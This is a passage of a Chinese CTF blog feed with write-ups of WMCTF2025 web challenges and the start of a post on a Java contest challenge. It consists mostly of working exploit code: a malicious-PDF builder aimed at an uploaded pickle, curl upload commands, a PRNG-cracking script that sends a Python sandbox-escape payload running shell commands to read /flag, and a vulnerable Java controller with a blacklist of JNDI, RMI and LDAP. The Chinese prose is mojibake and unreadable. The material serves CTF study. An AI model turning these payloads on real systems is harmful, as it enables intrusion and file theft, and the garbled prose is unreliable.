class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_pdf_name_abs</span>(<span class="hljs-params">abs_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> + abs_path.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;#2F&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_trigger_pdf</span>(<span class="hljs-params">cmap_abs_no_ext: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    enc_name = encode_pdf_name_abs(cmap_abs_no_ext)<br>    header = <span class="hljs-string">b&quot;%PDF-1.4\n%\xe2\xe3\xcf\xd3\n&quot;</span><br>    objs = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">obj</span>(<span class="hljs-params">n, body: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;n&#125;</span> 0 obj\n&quot;</span>.encode() + body + <span class="hljs-string">b&quot;\nendobj\n&quot;</span><br><br>    objs.append(obj(<span class="hljs-number">1</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>))<br>    objs.append(obj(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Pages /Count 1 /Kids [3 0 R] &gt;&gt;&quot;</span>))<br>    page = <span class="hljs-string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt; /Contents 4 0 R &gt;&gt;&quot;</span><br>    objs.append(obj(<span class="hljs-number">3</span>, page))<br>    stream = <span class="hljs-string">b&quot;BT /F1 12 Tf (A) Tj ET&quot;</span><br>    objs.append(obj(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="hljs-built_in">len</span>(stream) + stream + <span class="hljs-string">b&quot;\nendstream&quot;</span>))<br>    font_dict = <span class="hljs-string">f&quot;&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /Identity-H /Encoding <span class="hljs-subst">&#123;enc_name&#125;</span> /DescendantFonts [6 0 R] &gt;&gt;&quot;</span>.encode()<br>    objs.append(obj(<span class="hljs-number">5</span>, font_dict))<br>    objs.append(obj(<span class="hljs-number">6</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy /CIDSystemInfo &lt;&lt; /Registry (Adobe) /Ordering (Identity) /Supplement 0 &gt;&gt; &gt;&gt;&quot;</span>))<br><br>    buf = io.BytesIO()<br>    buf.write(header)<br>    offsets = []<br>    cursor = <span class="hljs-built_in">len</span>(header)<br>    <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> objs:<br>        offsets.append(cursor)<br>        buf.write(o)<br>        cursor += <span class="hljs-built_in">len</span>(o)<br><br>    xref_start = buf.tell()<br>    buf.write(<span class="hljs-string">b&quot;xref\n0 7\n&quot;</span>)<br>    buf.write(<span class="hljs-string">b&quot;0000000000 65535 f \n&quot;</span>)<br>    <span class="hljs-keyword">for</span> off <span class="hljs-keyword">in</span> offsets:<br>        buf.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;off:<span class="hljs-number">0</span>10d&#125;</span> 00000 n \n&quot;</span>.encode())<br>    buf.write(<span class="hljs-string">b&quot;trailer\n&lt;&lt; /Size 7 /Root 1 0 R &gt;&gt;\n&quot;</span>)<br>    buf.write(<span class="hljs-string">f&quot;startxref\n<span class="hljs-subst">&#123;xref_start&#125;</span>\n%%EOF\n&quot;</span>.encode())<br>    <span class="hljs-keyword">return</span> buf.getvalue()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    abs_no_ext = <span class="hljs-string">&quot;/proc/self/cwd/uploads/evil&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;trigger.pdf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(build_trigger_pdf(abs_no_ext))<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -sS -F <span class="hljs-string">&quot;file=@evil.pickle.gz;type=application/pdf;filename=evil.pickle.gz&quot;</span>   http://localhost:11451/upload | sed -n <span class="hljs-string">&#x27;1,80p&#x27;</span><br><br>curl -sS -F <span class="hljs-string">&quot;file=@trigger.pdf;type=application/pdf;filename=trigger.pdf&quot;</span>   http://localhost:11451/upload | sed -n <span class="hljs-string">&#x27;1,120p&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162922074.png" alt="image-20250926162922074"></p><p>è¿™é“æ„Ÿè§‰è¿˜å¥½ï¼Œæ¯•ç«Ÿå¾ˆå¤šéƒ½å¯ä»¥ç”¨ç°åœ¨çš„aiæ‹·æ‰“å‡ºæ¥ã€‚ã€‚ã€‚ï¼ˆ</p><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>éšæœºæ•°çš„ä¸€ä¸ªtrickï¼Œè®¿é—®624æ¬¡ä¹‹åå°±å¯ä»¥è·å–æ„é€ ï¼›</p><p>é¢˜ç›®å°±ç»™äº†ä¸ª<code>__builtin__</code>å°‘äº†ä¸ªsï¼Œæ‰€ä»¥æ˜¯è¯¯å¯¼é¡¹ã€‚ã€‚ã€‚</p><p><a href="https://stackered.com/blog/python-random-prediction/?utm_source=chatgpt.com#similarities-with-php">Breaking Pythonâ€™s PRNG with a few values and no bruteforce</a></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>ç­‰çˆ†ç ´å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyrandcracker <span class="hljs-keyword">import</span> RandCracker<br><span class="hljs-keyword">import</span> time, random, requests, json, os<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>rd = random.Random()<br><br>url = <span class="hljs-string">&#x27;http://localhost:11452&#x27;</span><br><br>data = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>)):<br><br>    res = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span>, json=&#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-built_in">str</span>(os.urandom(<span class="hljs-number">10</span>)),<br>        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">try</span>:<br>        user_id = res.json()[<span class="hljs-string">&#x27;user_id&#x27;</span>]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(res.text)<br><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    data.append(<span class="hljs-built_in">int</span>(user_id))<br><br><span class="hljs-comment"># åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨</span><br><br><span class="hljs-comment"># åˆå§‹åŒ–é¢„æµ‹å™¨</span><br>rc = RandCracker()<br><br><span class="hljs-comment"># data = [rd.getrandbits(32) for _ in range(624)]</span><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-comment"># æäº¤å…±è®¡312 * 64 = 19968ä½</span><br>    rc.submit(num)<br><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å¯è§£å¹¶è‡ªåŠ¨æ±‚è§£</span><br>rc.check()<br><br>key = rc.rnd.getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;predict next random number is <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[k for i,k in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()) if &#x27;__init__&#x27; in k.__dict__ and &#x27;wrapper&#x27; not in k.__init__.__str__()][0].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;mkdir /app/static/ &amp;&amp; cat /flag &gt; /app/static/1.txt&#x27;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># payload = &quot;[cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__==&#x27;Popen&#x27;][0](&#x27;mkdir -p static &amp;&amp; cat /flag &gt; static/flag.txt&#x27;, shell=True)&quot;</span><br><br>res = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/api&#x27;</span>, json=&#123;<br>    <span class="hljs-string">&#x27;key&#x27;</span>: key,<br>    <span class="hljs-string">&#x27;payload&#x27;</span>:payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(res.text)<br><br>res = requests.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/static/1.txt&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="EzParquet"><a href="#EzParquet" class="headerlink" title="EzParquet"></a>EzParquet</h2><p>æ¬§é˜³å­¦é•¿å¤ªç‰›äº†ã€‚ã€‚åˆç»™ç§’äº†www</p><p>ä½†æ—¢ç„¶å®˜æ–¹éƒ½ä¸æ”¾wpï¼Œé‚£æˆ‘ä¸è´´äº†hhhï¼Œç­‰é‚£è¾¹ä¿®äº†ä¹‹åç›´æ¥çœ‹å®˜æ–¹çš„å¤ç°å§</p><p>æ‰“çš„æ—¶å€™å› ä¸ºæˆ‘åœ¨windowsä¸Šçš„IDEAè·‘çš„ï¼Œæ‰€ä»¥éœ€è¦ä¸‹ä¸€ä¸ªwinutils.exeåˆ°hadoopæ–‡ä»¶å¤¹å¹¶ä¸”å†™åˆ°ç¯å¢ƒå˜é‡é‡Œï¼ˆä¹Ÿå¯ä»¥ä¸ç”¨ï¼ŒSystemè®¾ç½®å°±è¡Œäº†ï¼‰</p><p>ä¹‹åå°±æ˜¯ç”Ÿæˆä¸€ä¸ªparquetæ–‡ä»¶ï¼Œç›´æ¥ä¸Šä¼ ä¸Šå»è®©å®ƒè§£æå°±å¯ä»¥åå¼¹shelläº†ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250927001455201.png" alt="image-20250927001455201"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250927001312238.png" alt="image-20250927001312238"></p><h2 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h2><p>ï¼ˆå¾…å¤ç°ï¼‰</p><h2 id="safeline-unsolved"><a href="#safeline-unsolved" class="headerlink" title="safeline(unsolved)"></a>safeline(unsolved)</h2><p>é›·æ± éƒ½æ¥äº†ã€‚ã€‚ã€‚</p><p>åšä¸äº†åšä¸äº†</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.wm-team.cn/index.php/archives/86/">WMCTF2025 Official WriteUp - W&amp;M Team</a></p><p><a href="https://twilight-primula-227.notion.site/Syclover-WP-275ab1a3ffb1805d8f0ac517fb755bca">Syclover-WP</a></p><p><a href="https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-9">WMCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ</a></p><p><a href="https://www.cnblogs.com/L1nq/p/19107215">WMCTF 2025 Web Writeup - L1nq - åšå®¢å›­</a></p><p><a href="https://www.cnblogs.com/L1nq/p/19107215">WMCTF 2025 Web Writeup - L1nq - åšå®¢å›­</a></p><p><a href="https://cnup.top/?post=128">WMCTF2025-Writeup by 0psu3 - lzz0403çš„æŠ€æœ¯åšå®¢</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›åˆèµ›ä¸¤é“javaé¢˜å­¦ç‚¹å°trick</title>
    <link href="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/"/>
    <url>/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¸®å­¦å¼Ÿçœ‹äº†ä¼šé¢˜ï¼Œé¢˜ä¸éš¾ï¼Œç®—è®°å½•ä¸€ä¸‹å­¦ç‚¹æ–°çš„trickç„¶åå¢åŠ ç‚¹åšé¢˜åå°„å¼§å§ã€‚</p><h2 id="ezjaba"><a href="#ezjaba" class="headerlink" title="ezjaba"></a>ezjaba</h2><p>é¢˜ç›®å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, ScheduledJob&gt; jobs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] JOB_BLACKLIST = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>, <span class="hljs-string">&quot;org.yaml.snakeyaml&quot;</span>, <span class="hljs-string">&quot;org.springframework&quot;</span>, <span class="hljs-string">&quot;org.apache&quot;</span>, <span class="hljs-string">&quot;rmi&quot;</span>, <span class="hljs-string">&quot;ldap&quot;</span>, <span class="hljs-string">&quot;ldaps&quot;</span>, <span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] JOB_WHITELIST = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.jabaez.FLAG&quot;</span>&#125;;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/server&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getServerInfo</span><span class="hljs-params">()</span> &#123;<br>        Map&lt;String, Object&gt; info = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        info.put(<span class="hljs-string">&quot;javaHome&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;javaVersion&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;osName&quot;</span>, System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;userDir&quot;</span>, System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;uploadDir&quot;</span>, <span class="hljs-string">&quot;/tmp/uploads&quot;</span>);<br>        <span class="hljs-type">Charset</span> <span class="hljs-variable">gbk</span> <span class="hljs-operator">=</span> Charset.forName(<span class="hljs-string">&quot;GBK&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = gbk.encode(<span class="hljs-string">&quot;ä½ å¥½&quot;</span>).array();<br>        System.out.println(Arrays.toString(bytes));<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/upload&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, String&gt; <span class="hljs-title function_">uploadFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;<br>        Map&lt;String, String&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">uploadDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/uploads/&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir);<br>            <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>                dir.mkdirs();<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>            <span class="hljs-keyword">if</span> (originalFilename == <span class="hljs-literal">null</span>) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;æ–‡ä»¶åä¸ºç©º&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(originalFilename)).getName();<br>            <span class="hljs-keyword">if</span> (filename.contains(<span class="hljs-string">&quot;..&quot;</span>) || filename.contains(<span class="hljs-string">&quot;/&quot;</span>) || filename.contains(<span class="hljs-string">&quot;\\&quot;</span>) || filename.startsWith(<span class="hljs-string">&quot;.&quot;</span>)) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;éæ³•æ–‡ä»¶å&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            <span class="hljs-type">File</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir + filename);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">uploadPathCanonical</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir)).getCanonicalPath();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">destCanonical</span> <span class="hljs-operator">=</span> dest.getCanonicalPath();<br>            <span class="hljs-keyword">if</span> (!destCanonical.startsWith(uploadPathCanonical + File.separator)) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;éæ³•æ–‡ä»¶è·¯å¾„&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            file.transferTo(dest);<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;path&quot;</span>, dest.getAbsolutePath());<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, e.getMessage());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/job/add&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">addJob</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ScheduledJob job)</span> &#123;<br>        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.containsBlacklist(job.getInvokeTarget())) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;åŒ…å«éæ³•å­—ç¬¦&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.containsWhitelist(job.getInvokeTarget())) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ç›®æ 